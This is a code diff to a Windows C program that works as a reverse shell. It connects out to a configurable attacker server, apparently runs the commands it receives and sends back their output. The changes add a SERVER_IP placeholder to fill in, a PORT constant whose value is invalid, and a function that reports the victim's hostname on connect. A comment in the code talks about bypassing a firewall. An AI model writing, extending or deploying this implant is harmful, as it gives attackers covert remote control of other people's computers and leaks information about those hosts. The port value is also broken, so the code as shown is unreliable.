@@ -1,12 +1,18 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
+#include <string>
 #include <stdio.h>
+
 
 #define RED "\033[31m"
 #define GREEN "\033[32m"
 #define YELLOW "\033[33m"
 #define RESET "\033[0m"
+
+//Change This with You current Server Ip
+#define SERVER_IP "IP_PLACEHOLDER"  
+#define PORT 10293847576
 
 void active_ansi()
 {
@@ -45,6 +51,18 @@ static void exec_cmd_and_send(SOCKET sock, char *cmd)
     _pclose(fp);
 }
 
+static void send_hostname(SOCKET sock)
+{
+    char hostname[256];
+
+    if (gethostname(hostname, sizeof(hostname)) == 0)
+    {
+        char msg[300];
+        snprintf(msg, sizeof(msg), "[HOST]%s\n", hostname);
+        send(sock, msg, strlen(msg), 0);
+    }
+}
+
 int main()
 {
     WORD wVersionRequested;
@@ -77,8 +95,8 @@ int main()
 
     struct sockaddr_in saServer;
     saServer.sin_family = AF_INET;
-    saServer.sin_addr.s_addr = inet_addr("127.0.0.1");
-    saServer.sin_port = htons(4444); // port HTTPS pour bypass firewall
+    saServer.sin_addr.s_addr = inet_addr(SERVER_IP);
+    saServer.sin_port = htons((int)PORT); // port HTTPS pour bypass firewall
     if (connect(sock, (struct sockaddr*)&saServer, sizeof(saServer)) == SOCKET_ERROR)
     {
         printf(RED "[-] connect failed\n" RESET);
@@ -86,6 +104,7 @@ int main()
         return (1);
     }
     printf("[+] Connect initialized!\n");
+    send_hostname(sock);
     printf(GREEN "[+] Connected to server!\n" RESET);
     char buffer[1024];
     while (true)
